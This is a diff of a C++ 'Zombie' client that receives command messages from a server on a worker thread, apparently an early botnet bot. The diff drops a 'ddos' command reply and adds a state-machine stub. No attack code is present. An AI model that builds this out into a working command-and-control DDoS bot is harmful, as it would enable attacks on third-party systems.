@@ -1,21 +1,25 @@
 #include "Client.h"
+#include "Echo.h"
+#include "Standby.h"
 
 #include <thread>
 #include <mutex>
 #include <condition_variable>
+#include <atomic>
 
-static std::string rcvMsg;
 static std::condition_variable cv;
 static std::mutex mutex;
+static std::atomic<bool> arcvdMsg(false);
+bool rcvdMsg = false;
 
 void waitingForServerMsg(Client& zombie)
 {
 	while (true)
 	{
 		std::unique_lock<std::mutex> ul(mutex);
-		if (zombie.receiveFromServer())
-			rcvMsg = zombie.getSrvMsg();
-		cv.wait(ul, []() {return rcvMsg.empty(); });
+		arcvdMsg = zombie.receiveFromServer();
+		std::cout << "thread2 rcv" << std::endl;
+		cv.wait(ul, []() {return !arcvdMsg.load(); });
 	}
 }
 
@@ -28,6 +32,8 @@ int main()
 	std::cout << "Init Zombie" << std::endl;
 
 	Client Zombie;
+	//initial state
+	State* state = new Standby(Zombie);
 
 	if (!Zombie.init())
 		return 0;
@@ -41,19 +47,21 @@ int main()
 			worker.detach();
 			while (true)
 			{
+				if (arcvdMsg.load())
 				{
-					std::lock_guard guard1(mutex);
-					if (!rcvMsg.empty())
-					{
-						std::cout << rcvMsg << std::endl;
-						if (rcvMsg == "ddos")
-							Zombie.sendToSrv("Started Ddos", strlen("Started Ddos"));
-						else
-							Zombie.sendToSrv(rcvMsg.c_str(), rcvMsg.size());
-						rcvMsg.clear();
-					}
+					std::cout << "rcv" << std::endl;
+					rcvdMsg = true;
+					arcvdMsg = false;
+					cv.notify_one();
 				}
-				cv.notify_one();
+				if (rcvdMsg)
+				{
+					std::cout << Zombie.getSrvMsg() << std::endl;
+					rcvdMsg = false;
+				}
+				//std::cout << "update" << std::endl;
+				//state = state->update();
+				//state->run();
 			}
 		}
 		else
